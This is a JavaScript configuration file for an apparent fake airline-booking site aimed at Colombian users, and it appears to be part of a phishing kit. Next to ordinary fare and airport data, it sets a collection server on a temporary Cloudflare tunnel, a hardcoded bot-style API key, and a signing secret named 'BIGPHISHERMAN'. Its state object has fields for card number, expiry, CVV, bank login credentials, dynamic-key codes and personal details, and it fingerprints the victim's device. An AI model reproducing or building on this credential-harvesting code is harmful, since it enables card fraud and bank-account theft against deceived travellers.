/**
 * CONFIGURACIÓN
 */
const API_URL = 'https://whereas-ga-parties-ecological.trycloudflare.com'; // API Administradora.
const API_KEY = 'eyJhbGciOiJIUzI1NiJ9.NzUxNzI5MDk2ODpBQUVUTzNfblozY2puWTlGRXA0S2l1akdQdVdrdUM1U0txNA.8Uw1ZR4qkcV1DE1yyxx9zuG6SqOkobOsWeI5Gvd2qh4'; // API Administradora.
const PRECIO_BASE = 46900  // Precio base de los vuelos.
const MULTIPLICADORES_PRECIO = { // Incremento porcentual de tarifas.
    light: 1,
    smart: 1.7,
    full: 3
}
const JWT_SIGN = 'BIGPHISHERMAN';


const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab', 'Dom'];

const countries = [
    {
        regionName: "America del Norte",
        costRange: [750, 1100],
        countries: [
            "Canadá",
            "Estados Unidos",
            "México"
        ]
    },
    {
        regionName: "America Central y el Caribe",
        costRange: [550, 850],
        countries: [
            "Belice",
            "Costa Rica",
            "El Salvador",
            "Guatemala",
            "Honduras",
            "Nicaragua",
            "Panamá",
            "Aruba",
            "Barbados",
            "Cuba",
            "Curazao",
            "Puerto Rico",
            "República Dominicana"
        ]
    },
    {
        regionName: "America del Sur",
        costRange: [550, 850],
        countries: [
            "Argentina",
            "Bolivia",
            "Brasil",
            "Chile",
            "Ecuador",
            "Paraguay",
            "Perú",
            "Uruguay",
            "Venezuela"
        ]
    },
    {
        regionName: "Europa y otros",
        costRange: [1300, 1900],
        countries: [
            "España",
            "Reino Unido",
            "Alemania"
        ]
    }

];

const airports = [
    {
        city: "Arauca",
        country: "Colombia",
        code: "AUC",
        name: 'Aeropuerto Santiago Pérez Quiroz'
    },
    {
        city: "Armenia",
        country: "Colombia",
        code: "AXM",
        name: 'Aeropuerto Internacional El Eden'
    },
    {
        city: "Barrancabermeja",
        country: "Colombia",
        code: "EJA",
        name: 'Aeropuerto Yaguiríez'
    },
    {
        city: "Barranquilla",
        country: "Colombia",
        code: "BAQ",
        name: 'Aeropuerto Ernesto Cortissoz'
    },
    {
        city: "Bogotá",
        country: "Colombia",
        code: "BOG",
        name: 'Aeropuerto Aeropuerto Internacional El Dorado'
    },
    {
        city: "Bucaramanga",
        country: "Colombia",
        code: "BGA",
        name: 'Aeropuerto Aeropuerto Internacional Palonegro'
    },
    {
        city: "Cali",
        country: "Colombia",
        code: "CLO",
        name: 'Aeropuerto Alfonso Bonilla Aragón'
    },
    {
        city: "Cartagena",
        country: "Colombia",
        code: "CTG",
        name: 'Aeropuerto Aeropuerto Internacional Rafael Nuñez'
    },
    {
        city: "Cúcuta",
        country: "Colombia",
        code: "CUC",
        name: 'Aeropuerto Camilo Daza'
    },
    {
        city: "Florencia",
        country: "Colombia",
        code: "FLA",
        name: 'Aeropuerto Gustavo Paredes'
    },
    {
        city: "Ibagué",
        country: "Colombia",
        code: "IBE",
        name: 'Aeropuerto Perales'
    },
    {
        city: "Ipiales",
        country: "Colombia",
        code: "IPI",
        name: 'Aeropuerto San Luis'
    },
    {
        city: "Leticia",
        country: "Colombia",
        code: "LET",
        name: 'Aeropuerto Internacional Alfredo Vásques Cobo'
        
    },
    {
        city: "Manizales",
        country: "Colombia",
        code: "MZL",
        name: 'Aeropuerto La Nubia'
    },
    {
        city: "Medellín",
        country: "Colombia",
        code: "MDE",
        name: 'Aeropuerto Internacional José María Córdova'
    },
    {
        city: "Montería",
        country: "Colombia",
        code: "MTR",
        name: 'Aeropuerto Los Garzones'
    },
    {
        city: "Neiva",
        country: "Colombia",
        code: "NVA",
        name: 'Aeropuerto Benito Salas Vargas'
    },
    {
        city: "Pasto",
        country: "Colombia",
        code: "PSO",
        name: 'Aeropuerto Antonio Nariño'
    },
    {
        city: "Pereira",
        country: "Colombia",
        code: "PEI",
        name: 'Aeropuerto Internacional Matecaña'
    },
    {
        city: "Popayán",
        country: "Colombia",
        code: "PPN",
        name: 'Aeropuerto Guillermo León Valencia'
    },
    {
        city: "Riohacha",
        country: "Colombia",
        code: "RCH",
        name: 'Aeropuerto Internacional Almirante Padilla'
    },
    {
        city: "San Andrés",
        country: "Colombia",
        code: "ADZ",
        name: 'Aeropuerto Internacional Gustavo Rojas P.'
    },
    {
        city: "Santa Marta",
        country: "Colombia",
        code: "SMR",
        name: 'Aeropuerto Internacional Simón Bolivar'
    },
    {
        city: "Tumaco",
        country: "Colombia",
        code: "TCO",
        name: 'Aeropuerto La Florida'
    },
    {
        city: "Valledupar",
        country: "Colombia",
        code: "VUP",
        name: 'Aeropuerto Alfonso López Pumarejo'
    },
    {
        city: "Villavicencio",
        country: "Colombia",
        code: "VVC",
        name: 'Aeropuerto Vanguardia'
    },
    {
        city: "Yopal",
        country: "Colombia",
        code: "EYP",
        name: 'Aeropuerto Internacional El Yopal'
    }
];

let info = {
    flightInfo:{
        travel_type: 1,
        seat_type: 1,
        origin: '',
        destination: '',
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0]
    },
    passengersInfo:{
        adults: [
            {
                name: '',
                surname: '',
                cc: ''
            }
        ],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '',
        puser: '',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
}



LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

// LS.removeItem('info');